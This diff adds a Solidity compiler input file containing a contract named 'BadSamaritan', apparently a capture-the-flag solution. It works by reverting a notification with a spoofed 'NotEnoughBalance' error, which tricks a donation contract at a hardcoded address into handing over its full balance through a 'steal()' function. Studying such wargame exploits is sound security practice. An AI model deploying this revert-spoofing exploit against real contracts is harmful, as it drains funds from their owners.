@@ -1,0 +1,35 @@
+{
+  "language": "Solidity",
+  "sources": {
+    "contracts/BadSamaritan.sol": {
+      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity 0.8.7;\n\ninterface INotifyable {\n  function notify(uint256 amount) external;\n}\n\ncontract BadSamaritan is INotifyable {\n  error NotEnoughBalance();\n\n  function notify(uint256 amount) external pure override {\n    if (amount != 1000000) {\n      revert NotEnoughBalance();\n    }\n  }\n\n  function steal() public returns (bool success) {\n    (success, ) = address(0x26173a8bA05980F97D418890Ce04b1467c3de118).call(\n      abi.encodeWithSignature(\"requestDonation()\")\n    );\n    require(success, \"Could not steal.\");\n  }\n}\n"
+    }
+  },
+  "settings": {
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "outputSelection": {
+      "*": {
+        "*": [
+          "abi",
+          "evm.bytecode",
+          "evm.deployedBytecode",
+          "evm.methodIdentifiers",
+          "metadata",
+          "devdoc",
+          "userdoc",
+          "storageLayout",
+          "evm.gasEstimates"
+        ],
+        "": [
+          "ast"
+        ]
+      }
+    },
+    "metadata": {
+      "useLiteralContent": true
+    }
+  }
+}
